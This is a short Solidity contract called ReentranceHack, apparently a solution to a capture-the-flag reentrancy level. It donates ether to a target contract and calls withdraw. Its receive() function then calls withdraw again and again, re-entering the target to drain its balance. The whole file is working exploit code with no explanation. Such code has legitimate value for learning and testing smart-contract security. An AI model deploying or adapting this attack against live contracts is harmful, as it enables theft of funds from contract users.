// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract ReentranceHack {
    address reentrace;

    constructor(address reentrace_) {
        reentrace = reentrace_;
    }

    function attack() public payable {
        IReentrance(reentrace).donate{value: msg.value}(address(this));
        IReentrance(reentrace).withdraw(msg.value);
    }

    receive() external payable {
        IReentrance(reentrace).withdraw(msg.value);
    }
}
